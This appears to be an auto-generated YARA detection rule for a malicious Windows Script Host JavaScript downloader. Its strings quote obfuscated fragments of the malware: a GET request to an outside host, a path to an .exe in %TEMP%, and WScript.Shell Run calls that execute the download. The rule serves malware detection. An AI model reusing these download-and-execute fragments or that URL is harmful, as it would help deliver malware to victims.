rule sig_20160328_eca873eb2d586aa8a1de382161732aba {
  meta:
    description = "datamaliciousorder - file 20160328_eca873eb2d586aa8a1de382161732aba.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f8232449d6d1655629220f757e118b556af0d88e68b911c7b63ebea8aa30b770"

  strings:
    $s1  = "function Daqaut() {return Nkqjdu[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"rUyJ0bnJgWX5O.exe\";};" fullword ascii
    $s2  = "Bscgivajrq[Pspev](\"GET\", \"http://princesse-indienne.com/m6yaf\", false);" fullword ascii
    $s3  = "do {WScript[Lvjjam](Yzxzbikdn() * 11)} while (Bscgivajrq[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Nkqjdu = function Lyrmvob() {return WScript[Afvfda](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Cfrpg(Kylvxjw, Qnnec){return Kylvxjw - Qnnec;};" fullword ascii
    $s6  = "function Qswrgpsp() {return ((Zsavkyu == true) && (Zsavkyu == Dijug)) ? 1 : Qihfagaua;};" fullword ascii
    $s7  = "function Pwbfh(Xzznss){Nkqjdu[\"Run\"](Xzznss, Qihfagaua, Qihfagaua);};" fullword ascii
    $s8  = "return Cfrpg(Kccqjehuo, Kgpihsug);" fullword ascii
    $s9  = "function Xisei()" fullword ascii
    $s10 = " while (Mrmmw){" fullword ascii
    $s11 = "function Ynlmolgx(){return Lqnxylby;};" fullword ascii
    $s12 = "var Rjcecoplqe = new this[\"Date\"]();" fullword ascii
    $s13 = "var Iicxwb = false;" fullword ascii
    $s14 = "function Cvfim(){return Afvfda;};" fullword ascii
    $s15 = "Zsavkyu = true; " fullword ascii
    $s16 = "function Yzxzbikdn(){return 22;};" fullword ascii
    $s17 = "Dijug = true; " fullword ascii
    $s18 = "var Zsavkyu = false;" fullword ascii
    $s19 = "function Uecsvg(Vjarupi) {var Mhjvndqnat = (1, 2, 3, 4, 5, Vjarupi); return Mhjvndqnat;};" fullword ascii
    $s20 = "var Dijug = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}